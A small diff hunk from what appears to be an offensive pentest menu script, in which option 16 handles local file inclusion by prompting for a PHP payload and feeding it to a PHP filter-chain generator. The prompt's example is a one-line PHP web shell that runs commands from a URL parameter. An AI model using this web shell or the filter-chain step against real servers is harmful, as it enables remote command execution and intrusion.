@@ -170,7 +170,7 @@ case $number in
     16)
     echo "[+] Hey LFI right you need to create orgenerate the payload using php filters worry out"
     read -p "Enter the php payload ecample <?php system($_GET["cmd"]); ?>: " pay
-    python3 phpcrash.py --chain $pay
+    python3 phpcrash.py --chain '$pay'
     
 
     ;;
